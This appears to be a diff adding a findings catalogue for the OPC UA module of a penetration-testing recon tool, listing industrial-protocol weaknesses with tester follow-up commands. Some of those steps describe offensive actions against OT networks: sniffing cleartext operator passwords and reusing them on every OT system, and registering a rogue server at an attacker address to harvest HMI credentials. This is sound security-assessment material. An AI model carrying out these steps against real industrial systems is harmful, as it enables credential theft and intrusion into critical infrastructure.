@@ -1,0 +1,157 @@
+{
+  "service": "opcua",
+  "summary": "OPC UA module is a T1-heavy discovery probe with strong findings. Anonymous UserTokenPolicy detection, SecurityMode=None, cleartext credentials over None-policy, deprecated crypto policies, self-signed / weak-key certificate, open LDS RegisterServer are all deterministic T1 posture. Gap: does not actually establish a Session (CreateSession + ActivateSession + Browse) \u2014 that would move anonymous_allowed from T1 (advertised) to T2 (session-opened). Also no username bruteforce (deferred by design; needs RSA-OAEP against server cert).",
+  "module_files": [
+    "/home/kali/Desktop/projects/recce/recce/services/opcua.py"
+  ],
+  "findings": [
+    {
+      "kind": "opcua_reachable",
+      "title_pattern": "OPC UA server reachable on OT/enterprise segment",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "uacp HELLO/ACK is deterministic OPC UA fingerprint.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Segmentation stance.",
+      "promotion_risk": "none",
+      "tester_next_step": "opcua-client discover opc.tcp://<ip>:4840; opcua-client get-endpoints opc.tcp://<ip>:4840.",
+      "related_cves": []
+    },
+    {
+      "kind": "opcua_endpoints_enumerated",
+      "title_pattern": "OPC UA endpoints enumerated (GetEndpoints)",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "Enumeration only \u2014 spec-mandated unauthenticated discovery.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Feeds all other findings; T0 by nature.",
+      "promotion_risk": "none",
+      "tester_next_step": "For each endpoint URL, opcua-client connect --security-mode None --user-anonymous <endpoint>; then Browse RootFolder recursively.",
+      "related_cves": []
+    },
+    {
+      "kind": "opcua_anonymous_allowed",
+      "title_pattern": "OPC UA endpoint allows Anonymous user identity",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "UserTokenPolicy tokenType=Anonymous advertised in EndpointDescription \u2014 deterministic policy.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Establish anonymous CreateSession + ActivateSession + Read(NodeId 2258 ServerStatus) \u2014 a successful Read is T2 proof anonymous browse works. Requires SessionAuthenticationToken plumbing.",
+      "promotion_risk": "low",
+      "tester_next_step": "opcua-client browse --anonymous opc.tcp://<ip>:4840/ i=84; if browse returns children, opcua-client read --anonymous opc.tcp://<ip>:4840/ 'ns=0;i=2258' (ServerStatus) \u2014 dumps SDK build, start-time, current-time \u2014 proves anon session works.",
+      "related_cves": []
+    },
+    {
+      "kind": "opcua_security_mode_none",
+      "title_pattern": "OPC UA endpoint offers SecurityMode=None (unencrypted channel)",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "MessageSecurityMode=1 in EndpointDescription \u2014 deterministic policy.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Open a channel with SecurityMode=None and Browse \u2014 successful browse is proof; already covered by opcua_anonymous_allowed promotion when both apply.",
+      "promotion_risk": "none",
+      "tester_next_step": "opcua-client connect --none opc.tcp://<ip>:4840 && tcpdump -w /tmp/ua.pcap -i any 'host <ip> and port 4840' && Wireshark decode-as OPCUA \u2014 observe cleartext ReadResponse bodies.",
+      "related_cves": []
+    },
+    {
+      "kind": "opcua_credentials_in_cleartext",
+      "title_pattern": "OPC UA endpoint accepts UserName tokens over None security policy (cleartext credentials)",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "UserTokenPolicy UserName with policy_uri=None on a None-mode endpoint \u2014 deterministic exposure of password field on wire.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Passive PCAP capture during a legitimate login yields cleartext credentials \u2192 T3 initial access on that account. Not something recce can force.",
+      "promotion_risk": "medium",
+      "tester_next_step": "tcpdump -w /tmp/ua.pcap 'host <ip> and port 4840'; wait for legitimate operator login; extract password from ActivateSessionRequest.UserIdentityToken (visible ASCII in the None-policy path). Attempt harvested creds against every OT system.",
+      "related_cves": []
+    },
+    {
+      "kind": "opcua_deprecated_policy",
+      "title_pattern": "OPC UA endpoint offers deprecated security policy (Basic128Rsa15 / Basic256)",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "SecurityPolicyUri equal to a documented-deprecated policy \u2014 deterministic.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Bleichenbacher-style attacks on PKCS#1 v1.5 padding are theoretical against this profile; not practical.",
+      "promotion_risk": "none",
+      "tester_next_step": "Confirm the deprecated policy is actually usable by opening a channel with it: opcua-client connect --policy Basic128Rsa15 opc.tcp://<ip>:4840.",
+      "related_cves": []
+    },
+    {
+      "kind": "opcua_application_id",
+      "title_pattern": "OPC UA server discloses application and product identity (vendor fingerprint)",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "productUri from ApplicationDescription \u2014 fingerprint only.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Map productUri to known OPC UA SDK CVEs (open62541, UA-.NETStandard, prosys, Softing) \u2014 issue advisory-matched T1 findings.",
+      "promotion_risk": "none",
+      "tester_next_step": "Correlate productUri against CVE feed; e.g. open62541 CVE-2021-46882, ProSys UA SDK advisories. Check the vendor's web UI on 80/443 for default creds.",
+      "related_cves": []
+    },
+    {
+      "kind": "opcua_server_certificate",
+      "title_pattern": "OPC UA server certificate is self-signed / weak-key OR captured",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "Cert DER parsed, self-signed / weak-key derived from actual key_bits \u2014 deterministic property.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Certificate policy findings are inherently posture \u2014 no ethical promotion.",
+      "promotion_risk": "none",
+      "tester_next_step": "openssl x509 -in server.der -inform DER -noout -text; check for shared factory-default cert (hash collision across many devices in engagement).",
+      "related_cves": []
+    },
+    {
+      "kind": "opcua_find_servers",
+      "title_pattern": "OPC UA FindServers enumerated sibling servers and internal discoveryUrls",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "FindServers returns real sibling ApplicationDescriptions \u2014 deterministic enumeration.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Follow each discoveryUrl and re-probe \u2014 each is a new OT target to enumerate.",
+      "promotion_risk": "low",
+      "tester_next_step": "For each url returned: opcua-client discover <url>; enumerate the sibling.",
+      "related_cves": []
+    },
+    {
+      "kind": "opcua_lds_me_inventory",
+      "title_pattern": "OPC UA LDS-ME exposes network-wide server inventory (FindServersOnNetwork)",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "FindServersOnNetwork returns mDNS-registered records \u2014 real network inventory.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Use each discovery URL as a new target; use serverCapabilityFilter to narrow to LDS/DA servers.",
+      "promotion_risk": "none",
+      "tester_next_step": "For each record's discovery_url: opcua-client get-endpoints <url> to build the site-wide OPC UA inventory.",
+      "related_cves": []
+    },
+    {
+      "kind": "opcua_open_lds_registration",
+      "title_pattern": "OPC UA Discovery Server accepts unauthenticated RegisterServer (rogue-server primitive)",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "RegisterServerRequest with anonymous/None channel returned Good (service_result=0) \u2014 deterministic policy failure.",
+      "can_promote_to": "t3",
+      "promotion_notes": "T3 chain: register a rogue server pointing at attacker IP; wait for auto-connecting clients (engineering stations, HMIs) to CreateSession \u2192 capture UserName tokens (with None policy that's cleartext). Requires runtime infrastructure not in recce scope.",
+      "promotion_risk": "high",
+      "tester_next_step": "Launch attacker OPC UA server (open62541 server_ctt) on attacker IP; opcua-client register-server opc.tcp://<lds>:4840 --serverUri urn:evil --discoveryUrl opc.tcp://<attacker>:4840/. Wait for HMI connections in Wireshark; harvest UserName tokens.",
+      "related_cves": []
+    },
+    {
+      "kind": "opcua_error_banner",
+      "title_pattern": "OPC UA server leaks SDK / product version in ERR message",
+      "severity": "low",
+      "tier": "t0",
+      "tier_evidence": "Reason string from ERR frame \u2014 fingerprint only.",
+      "can_promote_to": "t1",
+      "promotion_notes": "If reason names a specific SDK+version, cross-reference to SDK CVEs.",
+      "promotion_risk": "none",
+      "tester_next_step": "printf '\\x48\\x45\\x4cF' | nc <ip> 4840 | xxd; correlate the reason string with open62541 / UA-.NETStandard / Softing SDK CVE feed.",
+      "related_cves": []
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_ot_assets",
+    "known_users"
+  ]
+}
